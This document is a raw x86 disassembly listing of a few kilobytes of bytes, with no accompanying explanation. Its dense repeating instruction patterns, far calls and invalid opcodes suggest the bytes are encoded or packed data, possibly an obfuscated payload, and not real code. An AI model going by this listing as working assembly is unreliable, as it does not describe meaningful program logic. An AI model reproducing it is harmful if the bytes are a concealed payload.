  430031:	xchg   esp,eax
  430032:	pop    ss
  430033:	loop   0x43001b
  430035:	bound  esp,QWORD PTR [edx+0x62]
  430038:	adc    al,0xdf
  43003a:	xor    DWORD PTR [ecx+0x61],esp
  43003d:	xchg   esp,eax
  43003e:	pop    ss
  43003f:	loop   0x4300ad
  430041:	bound  esp,QWORD PTR [edx+0x62]
  430044:	adc    al,0xa3
  430046:	int3   
  430047:	popa   
  430048:	popa   
  430049:	xchg   esp,eax
  43004a:	pop    ss
  43004b:	loop   0x430038
  43004d:	bound  esp,QWORD PTR [edx+0x62]
  430050:	adc    al,0xc5
  430052:	int3   
  430053:	popa   
  430054:	popa   
  430055:	xchg   esp,eax
  430056:	pop    ss
  430057:	jne    0x430034
  430059:	adc    al,0x34
  43005b:	int3   
  43005c:	popa   
  43005d:	popa   
  43005e:	xchg   esp,eax
  43005f:	pop    ss
  430060:	jne    0x43003b
  430062:	adc    al,0xe0
  430064:	int3   
  430065:	popa   
  430066:	popa   
  430067:	xchg   esp,eax
  430068:	pop    ss
  430069:	jne    0x4300d9
  43006b:	adc    al,0x9c
  43006d:	int3   
  43006e:	popa   
  43006f:	popa   
  430070:	xchg   esp,eax
  430071:	pop    ss
  430072:	jne    0x430029
  430074:	adc    al,0xe5
  430076:	int3   
  430077:	popa   
  430078:	popa   
  430079:	xchg   esp,eax
  43007a:	pop    ss
  43007b:	jne    0x430081
  43007d:	adc    al,0xa8
  43007f:	int3   
  430080:	popa   
  430081:	popa   
  430082:	xchg   esp,eax
  430083:	pop    ss
  430084:	jne    0x4300a0
  430086:	adc    al,0xe6
  430088:	int3   
  430089:	popa   
  43008a:	popa   
  43008b:	xchg   esp,eax
  43008c:	pop    ss
  43008d:	jne    0x43009f
  43008f:	adc    al,0x72
  430091:	int3   
  430092:	popa   
  430093:	popa   
  430094:	xchg   esp,eax
  430095:	pop    ss
  430096:	jne    0x4300a6
  430098:	adc    al,0xe3
  43009a:	int3   
  43009b:	popa   
  43009c:	popa   
  43009d:	xchg   esp,eax
  43009e:	pop    ss
  43009f:	jne    0x4300ad
  4300a1:	adc    al,0x9e
  4300a3:	int3   
  4300a4:	popa   
  4300a5:	popa   
  4300a6:	xchg   esp,eax
  4300a7:	pop    ss
  4300a8:	jne    0x4300bc
  4300aa:	adc    al,0x34
  4300ac:	int3   
  4300ad:	popa   
  4300ae:	popa   
  4300af:	xchg   esp,eax
  4300b0:	pop    ss
  4300b1:	jne    0x43009c
  4300b3:	adc    al,0x38
  4300b5:	int3   
  4300b6:	popa   
  4300b7:	popa   
  4300b8:	xchg   esp,eax
  4300b9:	pop    ss
  4300ba:	jne    0x4300ab
  4300bc:	adc    al,0xcc
  4300be:	inc    ebp
  4300bf:	popa   
  4300c0:	popa   
  4300c1:	xchg   esp,eax
  4300c2:	pop    ss
  4300c3:	jne    0x4300ba
  4300c5:	adc    al,0xd3
  4300c7:	es popa 
  4300c9:	popa   
  4300ca:	xchg   esp,eax
  4300cb:	pop    ss
  4300cc:	jne    0x4300d8
  4300ce:	adc    al,0xdc
  4300d0:	dec    eax
  4300d1:	popa   
  4300d2:	popa   
  4300d3:	xchg   esp,eax
  4300d4:	pop    ss
  4300d5:	jne    0x4300d8
  4300d7:	adc    al,0xdf
  4300d9:	xor    DWORD PTR [ecx+0x61],esp
  4300dc:	xchg   esp,eax
  4300dd:	pop    ss
  4300de:	jne    0x4300e7
  4300e0:	adc    al,0xa3
  4300e2:	int3   
  4300e3:	popa   
  4300e4:	popa   
  4300e5:	xchg   esp,eax
  4300e6:	pop    ss
  4300e7:	jne    0x4300e6
  4300e9:	adc    al,0xdf
  4300eb:	int3   
  4300ec:	popa   
  4300ed:	popa   
  4300ee:	xchg   esp,eax
  4300ef:	pop    ss
  4300f0:	jne    0x430146
  4300f2:	adc    al,0x34
  4300f4:	int3   
  4300f5:	popa   
  4300f6:	popa   
  4300f7:	xchg   esp,eax
  4300f8:	pop    ss
  4300f9:	jne    0x430155
  4300fb:	adc    al,0xe0
  4300fd:	int3   
  4300fe:	popa   
  4300ff:	popa   
  430100:	xchg   esp,eax
  430101:	pop    ss
  430102:	jne    0x430128
  430104:	adc    al,0xaa
  430106:	int3   
  430107:	popa   
  430108:	popa   
  430109:	xchg   esp,eax
  43010a:	pop    ss
  43010b:	jne    0x4300c8
  43010d:	adc    al,0xde
  43010f:	int3   
  430110:	popa   
  430111:	popa   
  430112:	xchg   esp,eax
  430113:	pop    ss
  430114:	jne    0x4300c7
  430116:	adc    al,0xa8
  430118:	int3   
  430119:	popa   
  43011a:	popa   
  43011b:	xchg   esp,eax
  43011c:	pop    ss
  43011d:	jne    0x4300d6
  43011f:	adc    al,0xdd
  430121:	int3   
  430122:	popa   
  430123:	popa   
  430124:	xchg   esp,eax
  430125:	pop    ss
  430126:	jne    0x4300d5
  430128:	adc    al,0x2d
  43012a:	int3   
  43012b:	popa   
  43012c:	popa   
  43012d:	xchg   esp,eax
  43012e:	pop    ss
  43012f:	jne    0x4300e4
  430131:	adc    al,0x13
  430133:	shl    DWORD PTR [ecx+0x61],cl
  430136:	xchg   esp,eax
  430137:	pop    ss
  430138:	jne    0x430142
  43013a:	adc    al,0x38
  43013c:	int3   
  43013d:	popa   
  43013e:	popa   
  43013f:	xchg   esp,eax
  430140:	pop    ss
  430141:	jne    0x430149
  430143:	adc    al,0x34
  430145:	int3   
  430146:	popa   
  430147:	popa   
  430148:	xchg   esp,eax
  430149:	pop    ss
  43014a:	jne    0x430160
  43014c:	adc    al,0x37
  43014e:	int3   
  43014f:	popa   
  430150:	popa   
  430151:	xchg   esp,eax
  430152:	pop    ss
  430153:	jne    0x43017f
  430155:	adc    al,0xcc
  430157:	mul    DWORD PTR [ecx+0x61]
  43015a:	xchg   esp,eax
  43015b:	pop    ss
  43015c:	jne    0x43017e
  43015e:	adc    al,0xdc
  430160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430161:	popa   
  430162:	popa   
  430163:	xchg   esp,eax
  430164:	pop    ss
  430165:	jne    0x430185
  430167:	adc    al,0x83
  430169:	mov    ecx,0x17946161
  43016e:	jne    0x43018c
  430170:	adc    al,0xec
  430172:	outs   dx,DWORD PTR ds:[esi]
  430173:	popa   
  430174:	popa   
  430175:	xchg   esp,eax
  430176:	pop    ss
  430177:	jne    0x43019b
  430179:	adc    al,0xa3
  43017b:	int3   
  43017c:	popa   
  43017d:	popa   
  43017e:	xchg   esp,eax
  43017f:	pop    ss
  430180:	jne    0x43017b
  430182:	adc    al,0xe3
  430184:	int3   
  430185:	popa   
  430186:	popa   
  430187:	xchg   esp,eax
  430188:	pop    ss
  430189:	loop   0x430131
  43018b:	bound  esp,QWORD PTR [edx+0x62]
  43018e:	adc    al,0x34
  430190:	int3   
  430191:	popa   
  430192:	popa   
  430193:	xchg   esp,eax
  430194:	pop    ss
  430195:	loop   0x4301c9
  430197:	bound  esp,QWORD PTR [edx+0x62]
  43019a:	adc    al,0xc5
  43019c:	int3   
  43019d:	popa   
  43019e:	popa   
  43019f:	xchg   esp,eax
  4301a0:	pop    ss
  4301a1:	loop   0x430215
  4301a3:	bound  esp,QWORD PTR [edx+0x62]
  4301a6:	adc    al,0xa1
  4301a8:	int3   
  4301a9:	popa   
  4301aa:	popa   
  4301ab:	xchg   esp,eax
  4301ac:	pop    ss
  4301ad:	loop   0x430157
  4301af:	bound  esp,QWORD PTR [edx+0x62]
  4301b2:	adc    al,0xdc
  4301b4:	int3   
  4301b5:	popa   
  4301b6:	popa   
  4301b7:	xchg   esp,eax
  4301b8:	pop    ss
  4301b9:	loop   0x430159
  4301bb:	bound  esp,QWORD PTR [edx+0x62]
  4301be:	adc    al,0x9d
  4301c0:	int3   
  4301c1:	popa   
  4301c2:	popa   
  4301c3:	xchg   esp,eax
  4301c4:	pop    ss
  4301c5:	loop   0x43014b
  4301c7:	bound  esp,QWORD PTR [edx+0x62]
  4301ca:	adc    al,0x7
  4301cc:	shl    DWORD PTR [ecx+0x61],cl
  4301cf:	xchg   esp,eax
  4301d0:	pop    ss
  4301d1:	loop   0x43017d
  4301d3:	bound  esp,QWORD PTR [edx+0x62]
  4301d6:	adc    al,0x72
  4301d8:	int3   
  4301d9:	popa   
  4301da:	popa   
  4301db:	xchg   esp,eax
  4301dc:	pop    ss
  4301dd:	loop   0x43017f
  4301df:	bound  esp,QWORD PTR [edx+0x62]
  4301e2:	adc    al,0xe1
  4301e4:	int3   
  4301e5:	popa   
  4301e6:	popa   
  4301e7:	xchg   esp,eax
  4301e8:	pop    ss
  4301e9:	loop   0x430181
  4301eb:	bound  esp,QWORD PTR [edx+0x62]
  4301ee:	adc    al,0xa9
  4301f0:	int3   
  4301f1:	popa   
  4301f2:	popa   
  4301f3:	xchg   esp,eax
  4301f4:	pop    ss
  4301f5:	loop   0x430193
  4301f7:	bound  esp,QWORD PTR [edx+0x62]
  4301fa:	adc    al,0x34
  4301fc:	int3   
  4301fd:	popa   
  4301fe:	popa   
  4301ff:	xchg   esp,eax
  430200:	pop    ss
  430201:	loop   0x4301a5
  430203:	bound  esp,QWORD PTR [edx+0x62]
  430206:	adc    al,0x84
  430208:	int3   
  430209:	popa   
  43020a:	popa   
  43020b:	xchg   esp,eax
  43020c:	pop    ss
  43020d:	loop   0x4301a7
  43020f:	bound  esp,QWORD PTR [edx+0x62]
  430212:	adc    al,0xcc
  430214:	mul    DWORD PTR [ecx+0x61]
  430217:	xchg   esp,eax
  430218:	pop    ss
  430219:	loop   0x430247
  43021b:	bound  esp,QWORD PTR [edx+0x62]
  43021e:	adc    al,0xdc
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	popa   
  430222:	popa   
  430223:	xchg   esp,eax
  430224:	pop    ss
  430225:	loop   0x43029b
  430227:	bound  esp,QWORD PTR [edx+0x62]
  43022a:	adc    al,0x83
  43022c:	mov    ecx,0x17946161
  430231:	loop   0x43020d
  430233:	bound  esp,QWORD PTR [edx+0x62]
  430236:	adc    al,0xec
  430238:	outs   dx,DWORD PTR ds:[esi]
  430239:	popa   
  43023a:	popa   
  43023b:	xchg   esp,eax
  43023c:	pop    ss
  43023d:	loop   0x43020f
  43023f:	bound  esp,QWORD PTR [edx+0x62]
  430242:	adc    al,0xa3
  430244:	int3   
  430245:	popa   
  430246:	popa   
  430247:	xchg   esp,eax
  430248:	pop    ss
  430249:	loop   0x430211
  43024b:	bound  esp,QWORD PTR [edx+0x62]
  43024e:	adc    al,0xe7
  430250:	int3   
  430251:	popa   
  430252:	popa   
  430253:	xchg   esp,eax
  430254:	pop    ss
  430255:	jne    0x4302af
  430257:	adc    al,0x34
  430259:	int3   
  43025a:	popa   
  43025b:	popa   
  43025c:	xchg   esp,eax
  43025d:	pop    ss
  43025e:	jne    0x4302a6
  430260:	adc    al,0xde
  430262:	int3   
  430263:	popa   
  430264:	popa   
  430265:	xchg   esp,eax
  430266:	pop    ss
  430267:	jne    0x430291
  430269:	adc    al,0xa3
  43026b:	int3   
  43026c:	popa   
  43026d:	popa   
  43026e:	xchg   esp,eax
  43026f:	pop    ss
  430270:	jne    0x430298
  430272:	adc    al,0x7a
  430274:	int3   
  430275:	popa   
  430276:	popa   
  430277:	xchg   esp,eax
  430278:	pop    ss
  430279:	jne    0x4302cb
  43027b:	adc    al,0x72
  43027d:	int3   
  43027e:	popa   
  43027f:	popa   
  430280:	xchg   esp,eax
  430281:	pop    ss
  430282:	jne    0x4302c2
  430284:	adc    al,0xe1
  430286:	int3   
  430287:	popa   
  430288:	popa   
  430289:	xchg   esp,eax
  43028a:	pop    ss
  43028b:	jne    0x4302c9
  43028d:	adc    al,0x2e
  43028f:	int3   
  430290:	popa   
  430291:	popa   
  430292:	xchg   esp,eax
  430293:	pop    ss
  430294:	jne    0x4302d8
  430296:	adc    al,0x34
  430298:	int3   
  430299:	popa   
  43029a:	popa   
  43029b:	xchg   esp,eax
  43029c:	pop    ss
  43029d:	jne    0x4302e7
  43029f:	adc    al,0x2d
  4302a1:	int3   
  4302a2:	popa   
  4302a3:	popa   
  4302a4:	xchg   esp,eax
  4302a5:	pop    ss
  4302a6:	jne    0x4302de
  4302a8:	adc    al,0x0
  4302aa:	das    
  4302ab:	popa   
  4302ac:	popa   
  4302ad:	xchg   esp,eax
  4302ae:	pop    ss
  4302af:	jne    0x4302c9
  4302b1:	adc    al,0x7
  4302b3:	jae    0x430316
  4302b5:	popa   
  4302b6:	xchg   esp,eax
  4302b7:	pop    ss
  4302b8:	jne    0x4302d0
  4302ba:	adc    al,0x1
  4302bc:	jmp    0x43031f
  4302be:	popa   
  4302bf:	xchg   esp,eax
  4302c0:	pop    ss
  4302c1:	jne    0x4302b6
  4302c3:	adc    al,0x19
  4302c5:	push   ecx
  4302c6:	popa   
  4302c7:	popa   
  4302c8:	xchg   esp,eax
  4302c9:	pop    ss
  4302ca:	jne    0x4302bd
  4302cc:	adc    al,0xdd
  4302ce:	fbld   TBYTE PTR [ecx+0x61]
  4302d1:	xchg   esp,eax
  4302d2:	pop    ss
  4302d3:	jne    0x430339
  4302d5:	adc    al,0xd1
  4302d7:	jno    0x43033a
  4302d9:	popa   
  4302da:	xchg   esp,eax
  4302db:	pop    ss
  4302dc:	jne    0x4302cb
  4302de:	adc    al,0x9c
  4302e0:	int3   
  4302e1:	popa   
  4302e2:	popa   
  4302e3:	xchg   esp,eax
  4302e4:	pop    ss
  4302e5:	jne    0x430318
  4302e7:	or     eax,0x6262e7e2
  4302ec:	bound  ecx,QWORD PTR ds:0x616850db
  4302f2:	popa   
  4302f3:	or     eax,0x17610d61
  4302f8:	loop   0x4302dd
  4302fa:	bound  esp,QWORD PTR [edx+0x62]
  4302fd:	push   DWORD PTR [ebp+0x60]
  430300:	cmp    al,0xff
  430302:	jne    0x43035b
  430304:	dec    ecx
  430305:	push   DWORD PTR [ebp+0x4e]
  430308:	push   DWORD PTR ss:[ebp+0x4d]
  43030c:	and    al,0xff
  43030e:	jne    0x43035c
  430310:	mov    al,0xff
  430312:	jne    0x430367
  430314:	loopne 0x430315
  430316:	jne    0x430381
  430318:	in     eax,dx
  430319:	push   DWORD PTR [ebp+0x30]
  43031c:	repz push DWORD PTR [ebp+0x67]
  430320:	inc    edx
  430321:	push   DWORD PTR [ebp+0x5e]
  430324:	lock push DWORD PTR [ebp+0x55]
  430328:	and    al,0xff
  43032a:	jne    0x430388
  43032c:	mov    al,0xff
  43032e:	jne    0x430393
  430330:	loopne 0x430331
  430332:	loop   0x4302e5
  430334:	arpl   WORD PTR [edx+0x62],sp
  430337:	repz jmp edx
  43033a:	lods   al,BYTE PTR ds:[esi]
  43033b:	arpl   WORD PTR [edx+0x62],sp
  43033e:	xor    eax,0x63b7e2ff
  430343:	bound  esp,QWORD PTR [edx-0x3e]
  430346:	jmp    edx
  430348:	mov    edx,0x64626263
  43034d:	jmp    edx
  43034f:	lods   eax,DWORD PTR ds:[esi]
  430350:	arpl   WORD PTR [edx+0x62],sp
  430353:	notrack jmp edx
  430356:	das    
  430357:	arpl   WORD PTR [edx+0x62],sp
  43035a:	out    dx,al
  43035b:	jmp    edx
  43035d:	mov    bl,0x63
  43035f:	bound  esp,QWORD PTR [edx+0x36]
  430362:	jmp    edx
  430364:	and    eax,0xe0626263
  430369:	or     eax,0xb859a75
  43036e:	call   0xa8e8:0x5e343ac9
  430375:	popa   
  430376:	pop    ss
  430377:	loop   0x43039d
  430379:	arpl   WORD PTR [edx+0x62],sp
  43037c:	out    dx,al
  43037d:	xchg   DWORD PTR ds:0xb858675,ecx
  430383:	call   0x6324:0x130d3ac9
  43038a:	bound  esp,QWORD PTR [edx+0x13]
  43038d:	outs   dx,BYTE PTR ds:[esi]
  43038e:	push   0x61a8e85e
  430393:	pop    ss
  430394:	loop   0x4303ba
  430396:	arpl   WORD PTR [edx+0x62],sp
  430399:	fsub   DWORD PTR [ebx]
  43039b:	and    al,0x63
  43039d:	bound  esp,QWORD PTR [edx+0x3b]
  4303a0:	jae    0x430325
  4303a2:	or     eax,0x626324e2
  4303a7:	bound  edx,QWORD PTR [ebx+0x60342c06]
  4303ad:	test   eax,ebx
  4303af:	popa   
  4303b0:	popa   
  4303b1:	popa   
  4303b2:	fcomp  DWORD PTR [edx+ebx*4]
  4303b5:	or     eax,0x62632413
  4303ba:	bound  eax,QWORD PTR [esp+ebp*1]
  4303bd:	lea    esp,[eax-0x12]
  4303c0:	and    ecx,DWORD PTR ds:0xb859a75
  4303c6:	call   0xa8e8:0x5e343ac9
  4303cd:	popa   
  4303ce:	pop    ss
  4303cf:	loop   0x430425
  4303d1:	arpl   WORD PTR [edx+0x62],sp
  4303d4:	out    dx,al
  4303d5:	xchg   DWORD PTR ds:0xb858675,ecx
  4303db:	call   0x6354:0x130d3ac9
  4303e2:	bound  esp,QWORD PTR [edx+0x13]
  4303e5:	outs   dx,BYTE PTR ds:[esi]
  4303e6:	push   0x61a8e85e
  4303eb:	pop    ss
  4303ec:	loop   0x430442
  4303ee:	arpl   WORD PTR [edx+0x62],sp
  4303f1:	fsub   DWORD PTR [ebx]
  4303f3:	push   esp
  4303f4:	arpl   WORD PTR [edx+0x62],sp
  4303f7:	cmp    dh,BYTE PTR [ebx-0x7d]
  4303fa:	or     eax,0x626354e2
  4303ff:	bound  edx,QWORD PTR [ebx+0x69342c06]
  430405:	test   eax,ebx
  430407:	popa   
  430408:	popa   
  430409:	popa   
  43040a:	fcomp  DWORD PTR [edx+ebx*4]
  43040d:	or     eax,0x62635413
  430412:	bound  eax,QWORD PTR [esp+ebp*1]
  430415:	lea    ebp,[ecx-0x12]
  430418:	and    ecx,DWORD PTR ds:0xb859a75
  43041e:	call   0xa8e8:0x5e343ac9
  430425:	popa   
  430426:	pop    ss
  430427:	loop   0x430426
  430429:	arpl   WORD PTR [edx+0x62],sp
  43042c:	out    dx,al
  43042d:	xchg   DWORD PTR ds:0xb858675,ecx
  430433:	call   0x63fd:0x130d3ac9
  43043a:	bound  esp,QWORD PTR [edx+0x13]
  43043d:	outs   dx,BYTE PTR ds:[esi]
  43043e:	push   0x61a8e85e
  430443:	pop    ss
  430444:	loop   0x430443
  430446:	arpl   WORD PTR [edx+0x62],sp
  430449:	fsub   DWORD PTR [ebx]
  43044b:	std    
  43044c:	arpl   WORD PTR [edx+0x62],sp
  43044f:	call   0x63fd:0xe20dd573
  430456:	bound  esp,QWORD PTR [edx-0x6d]
  430459:	push   es
  43045a:	outs   dx,BYTE PTR ds:[esi]
  43045b:	xor    al,0xb1
  43045d:	arpl   WORD PTR [edx+0x62],sp
  430460:	test   eax,ebx
  430462:	popa   
  430463:	popa   
  430464:	popa   
  430465:	fcomp  DWORD PTR [edx+ebx*4]
  430468:	or     eax,0x6263fd13
  43046d:	bound  eax,QWORD PTR [esi+ebp*2]
  430470:	lea    esi,[ecx-0x119d9d9d]
  430476:	repnz adc esi,DWORD PTR [ebp+0x5d]
  43047a:	pop    ss
  43047b:	loop   0x430474
  43047d:	bound  esp,QWORD PTR [edx+0x62]
  430480:	or     eax,0x6262f7e2
  430485:	bound  esp,QWORD PTR [ecx]
  430487:	popa   
  430488:	in     eax,dx
  430489:	push   ebp
  43048a:	(bad)  
  43048b:	ins    DWORD PTR es:[edi],dx
  43048c:	(bad)  
  43048d:	jmp    0x936d:0x8f55ed5d
  430494:	loop   0x430468
  430496:	push   0x5bd86161
  43049b:	jmp    0x430500
  43049d:	bound  esp,QWORD PTR [edx+0x61]
  4304a0:	and    edx,esp
  4304a2:	out    0x63,eax
  4304a4:	bound  esp,QWORD PTR [edx-0x10]
  4304a7:	inc    ebx
  4304a8:	xor    al,0x3a
  4304aa:	adc    al,0xe8
  4304ac:	int3   
  4304ad:	popa   
  4304ae:	popa   
  4304af:	xchg   esp,eax
  4304b0:	pop    ss
  4304b1:	loop   0x430492
  4304b3:	arpl   WORD PTR [edx+0x62],sp
  4304b6:	adc    al,0x34
  4304b8:	int3   
  4304b9:	popa   
  4304ba:	popa   
  4304bb:	xchg   esp,eax
  4304bc:	pop    ss
  4304bd:	loop   0x43049c
  4304bf:	arpl   WORD PTR [edx+0x62],sp
  4304c2:	adc    al,0xe3
  4304c4:	int3   
  4304c5:	popa   
  4304c6:	popa   
  4304c7:	xchg   esp,eax
  4304c8:	pop    ss
  4304c9:	loop   0x4304a6
  4304cb:	arpl   WORD PTR [edx+0x62],sp
  4304ce:	adc    al,0xa7
  4304d0:	int3   
  4304d1:	popa   
  4304d2:	popa   
  4304d3:	xchg   esp,eax
  4304d4:	pop    ss
  4304d5:	loop   0x4304b0
  4304d7:	arpl   WORD PTR [edx+0x62],sp
  4304da:	adc    al,0xe1
  4304dc:	int3   
  4304dd:	popa   
  4304de:	popa   
  4304df:	xchg   esp,eax
  4304e0:	pop    ss
  4304e1:	loop   0x430551
  4304e3:	arpl   WORD PTR [edx+0x62],sp
  4304e6:	adc    al,0xa3
  4304e8:	int3   
  4304e9:	popa   
  4304ea:	popa   
  4304eb:	xchg   esp,eax
  4304ec:	pop    ss
  4304ed:	loop   0x4304a4
  4304ef:	arpl   WORD PTR [edx+0x62],sp
  4304f2:	adc    al,0xf
  4304f4:	shl    DWORD PTR [ecx+0x61],cl
  4304f7:	xchg   esp,eax
  4304f8:	pop    ss
  4304f9:	loop   0x4304ff
  4304fb:	arpl   WORD PTR [edx+0x62],sp
  4304fe:	adc    al,0x96
  430500:	int3   
  430501:	popa   
  430502:	popa   
  430503:	xchg   esp,eax
  430504:	pop    ss
  430505:	loop   0x430521
  430507:	arpl   WORD PTR [edx+0x62],sp
  43050a:	adc    al,0xe6
  43050c:	int3   
  43050d:	popa   
  43050e:	popa   
  43050f:	xchg   esp,eax
  430510:	pop    ss
  430511:	loop   0x430523
  430513:	arpl   WORD PTR [edx+0x62],sp
  430516:	adc    al,0x72
  430518:	int3   
  430519:	popa   
  43051a:	popa   
  43051b:	xchg   esp,eax
  43051c:	pop    ss
  43051d:	loop   0x43052d
  43051f:	arpl   WORD PTR [edx+0x62],sp
  430522:	adc    al,0x34
  430524:	int3   
  430525:	popa   
  430526:	popa   
  430527:	xchg   esp,eax
  430528:	pop    ss
  430529:	loop   0x430537
  43052b:	arpl   WORD PTR [edx+0x62],sp
  43052e:	adc    al,0xa9
  430530:	int3   
  430531:	popa   
  430532:	popa   
  430533:	xchg   esp,eax
  430534:	pop    ss
  430535:	loop   0x430549
  430537:	arpl   WORD PTR [edx+0x62],sp
  43053a:	adc    al,0xcc
  43053c:	mul    DWORD PTR [ecx+0x61]
  43053f:	xchg   esp,eax
  430540:	pop    ss
  430541:	loop   0x43052c
  430543:	arpl   WORD PTR [edx+0x62],sp
  430546:	adc    al,0xdc
  430548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430549:	popa   
  43054a:	popa   
  43054b:	xchg   esp,eax
  43054c:	pop    ss
  43054d:	loop   0x43053e
  43054f:	arpl   WORD PTR [edx+0x62],sp
  430552:	adc    al,0x83
  430554:	mov    ecx,0x17946161
  430559:	loop   0x430550
  43055b:	arpl   WORD PTR [edx+0x62],sp
  43055e:	adc    al,0xec
  430560:	outs   dx,DWORD PTR ds:[esi]
  430561:	popa   
  430562:	popa   
  430563:	xchg   esp,eax
  430564:	pop    ss
  430565:	loop   0x430571
  430567:	arpl   WORD PTR [edx+0x62],sp
  43056a:	adc    al,0xa3
  43056c:	int3   
  43056d:	popa   
  43056e:	popa   
  43056f:	xchg   esp,eax
  430570:	pop    ss
  430571:	loop   0x430574
  430573:	arpl   WORD PTR [edx+0x62],sp
  430576:	or     eax,0xb858675
  43057b:	call   0xa8e8:0x5e343ac9
  430582:	popa   
  430583:	pop    ss
  430584:	loop   0x43059a
  430586:	arpl   WORD PTR [edx+0x62],sp
  430589:	or     eax,0xb859a75
  43058e:	call   0x24e2:0x6e213ac9
  430595:	dec    esi
  430596:	push   edi
  430597:	popa   
  430598:	bound  esp,QWORD PTR [edx+0x61]
  43059b:	popa   
  43059c:	adc    esp,edx
  43059e:	adc    al,0x63
  4305a0:	bound  esp,QWORD PTR [edx-0x2e]
  4305a3:	or     eax,0xb858675
  4305a8:	call   0xa8e8:0x5e343ac9
  4305af:	popa   
  4305b0:	rcl    BYTE PTR [ebx],cl
  4305b2:	loop   0x430593
  4305b4:	arpl   WORD PTR [edx+0x62],sp
  4305b7:	ror    BYTE PTR ds:0x6262e7e2,cl
  4305bd:	bound  ecx,QWORD PTR ds:0x6168f5db
  4305c3:	popa   
  4305c4:	bound  esi,QWORD PTR [edx+0xd]
  4305c7:	jne    0x43055b
  4305c9:	bound  ebx,QWORD PTR [eax+0x17]
  4305cc:	loop   0x4305b1
  4305ce:	arpl   WORD PTR [edx+0x62],sp
  4305d1:	fsub   DWORD PTR [ebx]
  4305d3:	jecxz  0x430638
  4305d5:	bound  esp,QWORD PTR [edx+0x61]
  4305d8:	out    0x93,eax
  4305da:	clc    
  4305db:	cmp    al,0x76
  4305dd:	test   DWORD PTR [ebp+eax*4+0x98b9759],0xf7763cf6
  4305e8:	mov    WORD PTR ds:0x6262e7e2,cs
  4305ee:	bound  ecx,QWORD PTR ds:0x616810db
  4305f4:	popa   
  4305f5:	or     eax,0x6fd69acd
  4305fa:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430600:	pop    esi
  430601:	call   0x9ae467ae
  430606:	xchg   ebx,eax
  430607:	loop   0x43063d
  430609:	xor    al,0x61
  43060b:	popa   
  43060c:	or     eax,0xb859a75
  430611:	call   0xa8e8:0x5e343ac9
  430618:	popa   
  430619:	or     eax,0x6262e713
  43061e:	bound  ecx,QWORD PTR ds:0x6168df17
  430624:	popa   
  430625:	pop    ss
  430626:	push   0x859a750d
  43062b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  430631:	call   0x135067de
  430636:	out    0x62,eax
  430638:	bound  esp,QWORD PTR [edx+0xd]
  43063b:	pop    ss
  43063c:	fld    TBYTE PTR [eax+0x61]
  43063f:	popa   
  430640:	pop    ss
  430641:	push   0x63bee2ff
  430646:	bound  esp,QWORD PTR [edx-0xd]
  430649:	jmp    edx
  43064b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43064c:	arpl   WORD PTR [edx+0x62],sp
  43064f:	xor    eax,0x63a4e2ff
  430654:	bound  esp,QWORD PTR [edx-0x3e]
  430657:	jmp    edx
  430659:	retf   
  43065a:	arpl   WORD PTR [edx+0x62],sp
  43065d:	fs jmp edx
  430660:	retf   0x6263
  430663:	bound  edi,QWORD PTR [esi]
  430665:	jmp    edx
  430667:	shl    DWORD PTR [ebx+0x62],0x62
  43066b:	out    dx,al
  43066c:	jmp    edx
  43066e:	shl    BYTE PTR [ebx+0x62],0x62
  430672:	ss jmp edx
  430675:	(bad)  
  430676:	arpl   WORD PTR [edx+0x62],sp
  430679:	loopne 0x43068f
  43067b:	jp     0x430649
  43067d:	popa   
  43067e:	popa   
  43067f:	xchg   esp,eax
  430680:	pop    ss
  430681:	loop   0x4306cf
  430683:	pop    esp
  430684:	bound  esp,QWORD PTR [edx+0x14]
  430687:	xor    al,0xcc
  430689:	popa   
  43068a:	popa   
  43068b:	xchg   esp,eax
  43068c:	pop    ss
  43068d:	loop   0x4306e1
  43068f:	pop    esp
  430690:	bound  esp,QWORD PTR [edx+0x14]
  430693:	jecxz  0x430661
  430695:	popa   
  430696:	popa   
  430697:	xchg   esp,eax
  430698:	pop    ss
  430699:	loop   0x4306f3
  43069b:	pop    esp
  43069c:	bound  esp,QWORD PTR [edx+0x14]
  43069f:	stos   BYTE PTR es:[edi],al
  4306a0:	int3   
  4306a1:	popa   
  4306a2:	popa   
  4306a3:	xchg   esp,eax
  4306a4:	pop    ss
  4306a5:	loop   0x4306ed
  4306a7:	pop    esp
  4306a8:	bound  esp,QWORD PTR [edx+0x14]
  4306ab:	in     al,0xd3
  4306ad:	popa   
  4306ae:	popa   
  4306af:	xchg   esp,eax
  4306b0:	pop    ss
  4306b1:	loop   0x4306db
  4306b3:	pop    esp
  4306b4:	bound  esp,QWORD PTR [edx+0x14]
  4306b7:	mov    eax,ds:0x946161cc
  4306bc:	pop    ss
  4306bd:	loop   0x4306e5
  4306bf:	pop    esp
  4306c0:	bound  esp,QWORD PTR [edx+0x14]
  4306c3:	loope  0x430691
  4306c5:	popa   
  4306c6:	popa   
  4306c7:	xchg   esp,eax
  4306c8:	pop    ss
  4306c9:	loop   0x43071b
  4306cb:	pop    esp
  4306cc:	bound  esp,QWORD PTR [edx+0x14]
  4306cf:	mov    ds:0x946161cc,eax
  4306d4:	pop    ss
  4306d5:	loop   0x430715
  4306d7:	pop    esp
  4306d8:	bound  esp,QWORD PTR [edx+0x14]
  4306db:	xor    al,0xcc
  4306dd:	popa   
  4306de:	popa   
  4306df:	xchg   esp,eax
  4306e0:	pop    ss
  4306e1:	loop   0x43071f
  4306e3:	pop    esp
  4306e4:	bound  esp,QWORD PTR [edx+0x14]
  4306e7:	xchg   esi,eax
  4306e8:	int3   
  4306e9:	popa   
  4306ea:	popa   
  4306eb:	xchg   esp,eax
  4306ec:	pop    ss
  4306ed:	loop   0x430731
  4306ef:	pop    esp
  4306f0:	bound  esp,QWORD PTR [edx+0x14]
  4306f3:	imul   eax,DWORD PTR [eax],0x17946161
  4306f9:	loop   0x430743
  4306fb:	pop    esp
  4306fc:	bound  esp,QWORD PTR [edx+0x14]
  4306ff:	in     eax,0x13
  430701:	popa   
  430702:	popa   
  430703:	xchg   esp,eax
  430704:	pop    ss
  430705:	loop   0x43073d
  430707:	pop    esp
  430708:	bound  esp,QWORD PTR [edx+0x14]
  43070b:	jo     0x430733
  43070d:	popa   
  43070e:	popa   
  43070f:	xchg   esp,eax
  430710:	pop    ss
  430711:	loop   0x43072b
  430713:	pop    esp
